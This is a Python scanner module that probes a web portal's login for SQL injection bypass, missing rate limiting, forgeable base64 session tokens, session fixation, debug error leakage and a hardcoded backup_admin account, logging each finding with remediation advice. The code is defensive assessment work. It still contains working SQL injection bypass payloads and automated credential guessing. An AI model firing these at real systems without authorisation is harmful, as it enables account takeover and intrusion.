import base64
import logging

import requests

from scanners.base import BaseScanner

logger = logging.getLogger(__name__)


class PortalScanner(BaseScanner):
    def run(self) -> list[dict]:
        logger.info(f"Starting Portal scan on {self.base_url}")
        self._check_sqli_login()
        self._check_brute_force()
        self._check_session_weakness()
        self._check_session_fixation()
        self._check_debug_mode()
        self._check_backup_credentials()
        logger.info(f"Portal scan complete. {len(self.findings)} findings.")
        return self.findings

    def _check_sqli_login(self):
        payloads = [
            ("' OR '1'='1' --", "anything"),
            ("admin' --", "anything"),
            ("' OR 1=1 --", "x"),
        ]

        for username, password in payloads:
            try:
                resp = requests.post(
                    f"{self.base_url}/login",
                    data={"username": username, "password": password},
                    allow_redirects=False,
                    timeout=10,
                )
                if resp.status_code in (301, 302) and "/dashboard" in resp.headers.get("Location", ""):
                    self.add_finding(
                        title="SQL Injection - Authentication Bypass",
                        severity="critical",
                        category="injection",
                        description="Login form is vulnerable to SQL injection, allowing authentication bypass.",
                        evidence=f"Payload: username='{username}', password='{password}'\nResponse: {resp.status_code} redirect to {resp.headers.get('Location')}",
                        remediation="Use parameterized queries (prepared statements). Never concatenate user input into SQL.",
                        cvss_score=9.8,
                    )
                    return
            except requests.RequestException as e:
                logger.warning(f"SQLi login check failed: {e}")

    def _check_brute_force(self):
        blocked = False
        attempts = 20

        for i in range(attempts):
            try:
                resp = requests.post(
                    f"{self.base_url}/login",
                    data={"username": "nonexistent", "password": f"wrong{i}"},
                    allow_redirects=False,
                    timeout=5,
                )
                if resp.status_code == 429:
                    blocked = True
                    break
            except requests.RequestException:
                break

        if not blocked:
            self.add_finding(
                title="No Brute Force Protection",
                severity="medium",
                category="authentication",
                description=f"No rate limiting detected after {attempts} failed login attempts.",
                evidence=f"Sent {attempts} failed login requests. No 429 (Too Many Requests) response received.",
                remediation="Implement rate limiting (e.g., 5 attempts per minute). Add CAPTCHA after failed attempts. Use account lockout.",
                cvss_score=5.3,
            )

    def _check_session_weakness(self):
        # First, get a valid session via SQLi
        try:
            resp = requests.post(
                f"{self.base_url}/login",
                data={"username": "' OR '1'='1' --", "password": "x"},
                allow_redirects=False,
                timeout=10,
            )
            session_cookie = resp.cookies.get("session", "")
            if not session_cookie:
                return

            try:
                decoded = base64.b64decode(session_cookie).decode()
                if ":" in decoded:
                    self.add_finding(
                        title="Weak Session Token (Predictable)",
                        severity="high",
                        category="session_management",
                        description="Session tokens are base64-encoded and contain plaintext username and timestamp. No cryptographic signing.",
                        evidence=f"Cookie value: {session_cookie}\nDecoded: {decoded}",
                        remediation="Use cryptographically signed session tokens (e.g., Flask-Login with secret key, JWT with HMAC).",
                        cvss_score=7.5,
                    )
            except Exception:
                pass

        except requests.RequestException as e:
            logger.warning(f"Session weakness check failed: {e}")

    def _check_session_fixation(self):
        try:
            fixed_session = base64.b64encode(b"attacker:9999999999").decode()
            resp = requests.post(
                f"{self.base_url}/login?session_id={fixed_session}",
                data={"username": "' OR '1'='1' --", "password": "x"},
                allow_redirects=False,
                timeout=10,
            )
            set_cookie = resp.headers.get("Set-Cookie", "")
            if fixed_session in set_cookie:
                self.add_finding(
                    title="Session Fixation Vulnerability",
                    severity="high",
                    category="session_management",
                    description="The application accepts session IDs from URL parameters, enabling session fixation attacks.",
                    evidence=f"Sent session_id={fixed_session} in URL.\nSet-Cookie contains the fixed session value.",
                    remediation="Always generate new session IDs on login. Never accept session IDs from URL parameters.",
                    cvss_score=7.5,
                )
        except requests.RequestException as e:
            logger.warning(f"Session fixation check failed: {e}")

    def _check_debug_mode(self):
        endpoints = [
            ("GET", f"{self.base_url}/nonexistent_page_xyzzy", None),
            ("POST", f"{self.base_url}/login", {"username": "' invalid sql", "password": "x"}),
        ]

        for method, url, data in endpoints:
            try:
                if method == "GET":
                    resp = requests.get(url, timeout=10)
                else:
                    resp = requests.post(url, data=data, allow_redirects=False, timeout=10)

                text = resp.text.lower()
                if any(indicator in text for indicator in ["traceback", "debugger", "werkzeug", "sqlite3", "operationalerror", "syntax error"]):
                    self.add_finding(
                        title="Debug Mode Enabled - Information Disclosure",
                        severity="medium",
                        category="information_disclosure",
                        description="The application exposes detailed error messages or stack traces, revealing internal implementation details.",
                        evidence=f"{method} {url}\nResponse snippet: {resp.text[:500]}",
                        remediation="Disable debug mode in production (set DEBUG=False). Use custom error pages. Never expose raw error messages.",
                        cvss_score=5.3,
                    )
                    return
            except requests.RequestException as e:
                logger.warning(f"Debug mode check failed: {e}")

    def _check_backup_credentials(self):
        try:
            resp = requests.post(
                f"{self.base_url}/login",
                data={"username": "backup_admin", "password": "backup123"},
                allow_redirects=False,
                timeout=10,
            )
            if resp.status_code in (301, 302) and "/dashboard" in resp.headers.get("Location", ""):
                self.add_finding(
                    title="Backup Admin Credentials Active",
                    severity="high",
                    category="authentication",
                    description="A backup admin account with weak credentials (backup_admin:backup123) is active.",
                    evidence=f"POST /login with backup_admin:backup123 → redirect to /dashboard",
                    remediation="Remove backup accounts. If needed, use strong, unique passwords and monitor for usage.",
                    cvss_score=7.2,
                )
        except requests.RequestException as e:
            logger.warning(f"Backup credentials check failed: {e}")
